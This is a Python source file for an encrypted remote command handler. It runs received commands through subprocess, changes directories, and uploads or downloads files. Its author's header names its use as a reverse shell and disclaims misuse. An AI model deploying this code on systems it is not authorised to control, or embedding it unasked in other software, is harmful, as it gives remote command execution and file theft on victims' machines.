#!/usr/bin/env python3

"""
Author: Sean Brady
Date: 08/12/2022

ATTENTION/CAUTION
I AM NOT RESPONSIBLE FOR ANY USER MISUSE OF THE CODE IN THIS REPOSITORY!
If you're using it as a reverse shell, only hack your own system/systems you have legal authority to use/pentest
"""

from modules.comms import secure_send, recv_data, sget_pubkey
import nacl.utils
from nacl.public import PrivateKey, Box
import pickle
import os
import shlex
import subprocess
import time


BUFFER_SIZE = 4096 * 256

class Session_Handler(object):
	def __init__(self, connection_object, ip, port):
		# Setting up the server connection and keys
		self.conn_object = connection_object
		self.ip = ip
		self.port = port
		self.privkey = PrivateKey.generate()
		self.pubkey = self.privkey.public_key
		self.client_pubkey = sget_pubkey(self.conn_object, self.pubkey._public_key)

		self.server_box = Box(self.privkey, self.client_pubkey)


	def send_cwd(self):
		"""
		Function to give the client side application the 
		Current Working Directory to be displayed like in a terminal
		"""
		try:
			cwd = ("\r" + os.getcwd()).encode('utf-8')
			secure_send(self.conn_object, cwd, self.server_box)
		except BrokenPipeError:
			print(f"[INFO] USER {self.ip}:{self.port} DISCONECTED")

	def change_directory(self, splited_command):
		"""
		Function to change the current working directory 
		of the process handling the clients connection
		"""
		try:
			os.chdir(''.join(splited_command[1]))
			output = b"[INFO] Directory Changed"
		except FileNotFoundError:
			output = b"[INFO] Directory Not Found"
		finally:
			cwd = os.getcwd().encode('utf-8')

		array = pickle.dumps([output, cwd])
		return array

	def execute(self, splited_command):
		"""
		Function to use subprocess.check_output to run and check output for most other commands
		"""
		try:
			output = subprocess.check_output(splited_command, stderr=subprocess.STDOUT)
			return output
		except (subprocess.CalledProcessError, FileNotFoundError) as e:
			output = f"[ERROR] Command Not Recognized/Errored. {e}".encode('utf-8')
			return output

	def upload(self, cmd: list) -> bytes:
		"""
		Function for the client uploading to the server
		"""
		with open(cmd[1], 'w') as file:
			file.writelines(cmd[2])
		print(f"[SAVED] File {cmd[1]} Saved")
		return b"[SAVED] File Saved"

	def download(self, cmd: list) -> bytes:
		file_buffer = ''

		try:
			with open(cmd[1], 'r') as file:
				# This will hold the text of the file
				file_buffer = ''.join(file.readlines())

			return file_buffer.encode('utf-8')

		except FileNotFoundError:
			return b"[ERROR] File not found, please enter the correct path and/or make sure that the file exists on the system."
		

	def session_handler(self):
		"""
		This function will handle the session between host and client
		"""
		self.send_cwd()
		try:
			while True:
				output = b''
		
				cmd = recv_data(self.conn_object, BUFFER_SIZE, self.server_box)
				if cmd == b'':
					continue
				elif cmd == None:
					break

				print(f"[COMMAND INFO] Received: {cmd}")

				if type(cmd) != list:

					# The data that comes in needs to be split due to how subprocess functions work
					splited_cmd = shlex.split(cmd)

					# When the program recieved nothing from client or if the FIN packet was sent
					if cmd.lower() == "exit" or not cmd:
						print(f"[INFO] USER {self.ip}:{self.port} DISCONECTED")
						exit(1)

					elif splited_cmd[0].lower() == "cd":
						# Change cwd
						output = self.change_directory(splited_cmd)

					else:
						# Execute command
						output = self.execute(splited_cmd)

				else:
					if cmd[0].lower() == 'upload':
						output = self.upload(cmd)
						
					else:
						output = self.download(cmd)
  
				if output:
					try:
						secure_send(self.conn_object, output, self.server_box)
				# If the user is disconnected randomly then stop this connection
					except BrokenPipeError:
						print(f"[INFO] USER {self.ip}:{self.port} DISCONECTED")
						exit(1)
				else:
					secure_send(self.conn_object, b"[INFO] Command executed", self.server_box)
		except Exception as e:
			print(f"[SHUTDOWN] Closing Sever due to Error: {e}")
			self.conn_object.close()
